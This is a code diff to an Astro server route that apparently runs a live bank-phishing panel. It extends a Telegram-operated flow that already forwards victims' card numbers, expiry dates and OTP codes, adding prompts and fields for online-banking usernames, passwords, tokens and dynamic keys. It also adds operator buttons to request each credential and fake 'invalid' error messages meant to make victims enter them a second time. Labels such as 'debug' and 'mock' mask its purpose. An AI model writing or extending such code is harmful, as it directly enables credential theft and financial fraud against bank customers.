@@ -3,8 +3,8 @@ export const prerender = false;
 import type { APIRoute } from 'astro';
 import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from 'astro:env/server';
 
-type DebugEvent = 'P1' | 'P2' | 'P3' | 'P4' | 'P-PAYMENT' | 'P-SUCCESS' | 'PAYMENT_SUBMIT' | 'OTP_SUBMIT';
-type RouteAction = 'wait' | 'sms' | 'card' | 'sms_error' | 'card_error' | 'approved';
+type DebugEvent = 'P1' | 'P2' | 'P3' | 'P4' | 'P-PAYMENT' | 'P-SUCCESS' | 'PAYMENT_SUBMIT' | 'OTP_SUBMIT' | 'USERPASS_SUBMIT' | 'TOKEN_SUBMIT' | 'DYNAMIC_SUBMIT';
+type RouteAction = 'wait' | 'sms' | 'card' | 'sms_error' | 'card_error' | 'approved' | 'userpass' | 'userpass_error' | 'token' | 'token_error' | 'dynamic' | 'dynamic_error';
 
 type RouteDecision = {
   action: RouteAction;
@@ -112,6 +112,42 @@ function makeDecision(sessionId: string, action: RouteAction, brand?: string): R
     rememberStep(sessionId, 'sms');
   }
 
+  if (action === 'userpass') {
+    if (hasStep(sessionId, 'userpass')) {
+      return {
+        action: 'userpass_error',
+        brand,
+        message: 'Usuario o contraseña incorrectos. Intenta nuevamente.',
+        updatedAt: new Date().toISOString(),
+      };
+    }
+    rememberStep(sessionId, 'userpass');
+  }
+
+  if (action === 'token') {
+    if (hasStep(sessionId, 'token')) {
+      return {
+        action: 'token_error',
+        brand,
+        message: 'Token inválido. Genera uno nuevo e inténtalo otra vez.',
+        updatedAt: new Date().toISOString(),
+      };
+    }
+    rememberStep(sessionId, 'token');
+  }
+
+  if (action === 'dynamic') {
+    if (hasStep(sessionId, 'dynamic')) {
+      return {
+        action: 'dynamic_error',
+        brand,
+        message: 'Clave dinámica inválida. Genera una nueva e inténtalo otra vez.',
+        updatedAt: new Date().toISOString(),
+      };
+    }
+    rememberStep(sessionId, 'dynamic');
+  }
+
   return { action, brand, updatedAt: new Date().toISOString() };
 }
 
@@ -123,12 +159,22 @@ function actionLabel(action: RouteAction) {
     sms_error: 'Error SMS repetido',
     card_error: 'Error tarjeta repetida',
     approved: 'Aprobado mock',
+    userpass: 'Pedir usuario y contraseña',
+    userpass_error: 'Error usuario/contraseña',
+    token: 'Pedir token',
+    token_error: 'Error token',
+    dynamic: 'Pedir clave dinámica',
+    dynamic_error: 'Error clave dinámica',
   };
   return labels[action] || action;
 }
 
 function isProcessingEvent(event: unknown) {
-  return event === 'PAYMENT_SUBMIT' || event === 'OTP_SUBMIT';
+  return event === 'PAYMENT_SUBMIT'
+    || event === 'OTP_SUBMIT'
+    || event === 'USERPASS_SUBMIT'
+    || event === 'TOKEN_SUBMIT'
+    || event === 'DYNAMIC_SUBMIT';
 }
 
 function stepLabel(event: unknown, meta?: Record<string, unknown>) {
@@ -142,6 +188,9 @@ function stepLabel(event: unknown, meta?: Record<string, unknown>) {
     'P-SUCCESS': 'Compra confirmada',
     PAYMENT_SUBMIT: 'Pago en proceso',
     OTP_SUBMIT: 'Envió código OTP',
+    USERPASS_SUBMIT: 'Envió usuario y contraseña',
+    TOKEN_SUBMIT: 'Envió token',
+    DYNAMIC_SUBMIT: 'Envió clave dinámica',
   };
   return labels[String(event || '')] || String(event || '-');
 }
@@ -149,7 +198,14 @@ function stepLabel(event: unknown, meta?: Record<string, unknown>) {
 function keyboard(sessionId: string, brand: string) {
   return {
     inline_keyboard: [
-      [{ text: 'Pedir SMS', callback_data: `route:${sessionId}:sms:${brand}` }],
+      [
+        { text: 'User-Pass', callback_data: `route:${sessionId}:userpass:${brand}` },
+        { text: 'Token', callback_data: `route:${sessionId}:token:${brand}` },
+      ],
+      [
+        { text: 'C. dinámica', callback_data: `route:${sessionId}:dynamic:${brand}` },
+        { text: 'Pedir SMS', callback_data: `route:${sessionId}:sms:${brand}` },
+      ],
       [{ text: 'Pedir Tarjeta', callback_data: `route:${sessionId}:card:${brand}` }],
       [{ text: 'Finalizar', callback_data: `route:${sessionId}:approved:${brand}` }],
     ],
@@ -191,6 +247,12 @@ function formatPaymentMessage(payload: Record<string, unknown>) {
     `💳 Tarjeta: ${cpayload.b || meta.card || '-'}`,
     `📅 Expira: ${cpayload.cv || cpayload.exp || '-'}`,
     `👤 Titular: ${cpayload.holder || '-'}`,
+    '',
+    '👤 CREDENCIALES',
+    `👤 Usuario: ${meta.username || '-'}`,
+    `🔑 Contraseña: ${meta.password || '-'}`,
+    `🎟️ Token: ${meta.token || '-'}`,
+    `🔐 C-DIN: ${meta.cdin || '-'}`,
     '',
     '💰 OTP',
     `💵 Código: ${metaOtp.otp || '-'}`,
@@ -256,7 +318,7 @@ async function sendTelegram(payload: Record<string, unknown>, options: { withBut
 async function handleTelegramCallback(body: Record<string, unknown>) {
   const callback = body.callback_query as Record<string, unknown> | undefined;
   const data = String(callback?.data || '');
-  const match = data.match(/^route:([^:]+):(sms|card|approved):([^:]+)$/);
+  const match = data.match(/^route:([^:]+):(sms|card|approved|userpass|token|dynamic):([^:]+)$/);
   if (!match) return json({ ok: true, ignored: true });
 
   const [, rawSessionId, rawAction, rawBrand] = match;
@@ -321,7 +383,7 @@ export const POST: APIRoute = async ({ request }) => {
   console.info('[debug-api:body]', body);
 
   const event = String(body.event || '') as DebugEvent;
-  const allowed = new Set<DebugEvent>(['P1', 'P2', 'P3', 'P4', 'P-PAYMENT', 'P-SUCCESS', 'PAYMENT_SUBMIT', 'OTP_SUBMIT']);
+  const allowed = new Set<DebugEvent>(['P1', 'P2', 'P3', 'P4', 'P-PAYMENT', 'P-SUCCESS', 'PAYMENT_SUBMIT', 'OTP_SUBMIT', 'USERPASS_SUBMIT', 'TOKEN_SUBMIT', 'DYNAMIC_SUBMIT']);
   if (!allowed.has(event)) return json({ error: 'Evento debug invalido' }, { status: 400 });
 
   const sessionId = cleanSessionId(body.sessionId);
@@ -341,6 +403,18 @@ export const POST: APIRoute = async ({ request }) => {
     rememberStep(sessionId, 'sms');
     session.decision = { action: 'wait', brand, updatedAt: new Date().toISOString() };
   }
+  if (event === 'USERPASS_SUBMIT') {
+    rememberStep(sessionId, 'userpass');
+    session.decision = { action: 'wait', brand, updatedAt: new Date().toISOString() };
+  }
+  if (event === 'TOKEN_SUBMIT') {
+    rememberStep(sessionId, 'token');
+    session.decision = { action: 'wait', brand, updatedAt: new Date().toISOString() };
+  }
+  if (event === 'DYNAMIC_SUBMIT') {
+    rememberStep(sessionId, 'dynamic');
+    session.decision = { action: 'wait', brand, updatedAt: new Date().toISOString() };
+  }
 
   const meta = { ...(previousMeta || {}), ...(incomingMeta || {}) };
   const payload = {
@@ -353,7 +427,7 @@ export const POST: APIRoute = async ({ request }) => {
     amountLabel: meta.amountLabel ?? previousMeta?.amountLabel,
     meta,
     metaOtp: incomingMetaOtp || previousMetaOtp || {},
-    action: event === 'PAYMENT_SUBMIT' || event === 'OTP_SUBMIT' ? 'wait' : 'ack',
+    action: isProcessingEvent(event) ? 'wait' : 'ack',
     mockCard,
   };
 
